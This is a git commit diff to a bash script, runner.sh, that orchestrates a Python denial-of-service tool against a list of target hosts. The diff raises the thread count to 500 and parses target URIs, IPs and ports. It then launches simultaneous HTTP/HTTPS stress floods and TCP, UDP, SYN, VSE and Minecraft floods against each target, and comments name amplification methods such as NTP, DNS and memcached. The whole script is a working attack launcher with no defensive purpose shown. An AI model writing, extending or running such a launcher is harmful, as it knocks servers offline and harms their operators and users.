796cffe0a0f314da5737498c2b46e7f054584c5c
rxitech <100522592+rxitech@users.noreply.github.com>
2022-03-11 11:34:49 +0100

    Update runner.sh

--- runner.sh
+++ runner.sh
@@ -1,20 +1,54 @@
 #!/bin/bash
 
-maxThreads=100
+maxThreads=500
 
-hosts=$(cat ./$1 | jq "[ . | to_entries[] | select(.value) | .value ] | unique " | jq -c ".[]")
-hostsCount=$(echo $hosts | jq -cRs 'split(" " )' | jq length )
-threadsCount=$(( maxThreads / hostsCount ))
 runner=""
 
-for host in ${hosts[@]}; do
-        if [ -z "$runner" ]; then
-                runner="python3 start.py STRESS https://${host:1:-1} 0 $threadsCount 0 0 $2"
-        else
-                runner="${runner} & python3 start.py STRESS https://${host:1:-1} 0 $threadsCount 0 0 $2"
-        fi
+# ALL L4 methods
+# "TCP", "UDP", "SYN", "VSE", "MINECRAFT", "MEM", "NTP", "DNS", "ARD", "CHAR", "RDP"
+# L4 methods requiring reflector file
+# "NTP", "DNS", "RDP", "CHAR", "MEM", "ARD"
 
-done
-runner="${runner} && fg"
+METHODS=("TCP" "UDP" "SYN" "VSE" "MINECRAFT" )
+
+lineCount=$(wc -l < $1)
+
+while read line; do
+        readarray -d ";" -t row <<< "$line"
+        length=${#row[@]}
+
+        uri=${row[0]}
+        ip=${row[1]}
+
+
+        threadsCount=$(( maxThreads / ( ( length - 2 ) * ${#METHODS[@]} * lineCount ) ))
+        for (( i=2; i < ${length}; i++ )); do
+                port=${row[$i]}
+                if [ -z $port ]; then
+                        if [ -z "$runner" ]; then
+                                runner="python3 start.py STRESS https://$uri 0 $threadsCount 0 0 $2"
+                                runner="${runner} & python3 start.py STRESS http://$uri 0 $threadsCount 0 0 $2"
+                        else
+                                runner="${runner} & python3 start.py STRESS https://$uri 0 $threadsCount 0 0 $2"
+                                runner="${runner} & python3 start.py STRESS http://$uri 0 $threadsCount 0 0 $2"
+                        fi
+
+                        break
+                fi
+
+
+                for m in ${METHODS[@]}; do
+                        if [ -z "$runner" ]; then
+                                runner="python3 start.py $m $ip:$port $threadsCount $2 0"
+                        else
+                                runner="${runner} & python3 start.py $m $ip:$port $threadsCount $2 0"
+                        fi
+
+                        if [ $m  == "MINECRAFT" ] || [ $m == "TCP" ] ; then
+                                runner="${runner} 0"
+                        fi
+                done
+        done
+done < $1
 
 eval $runner
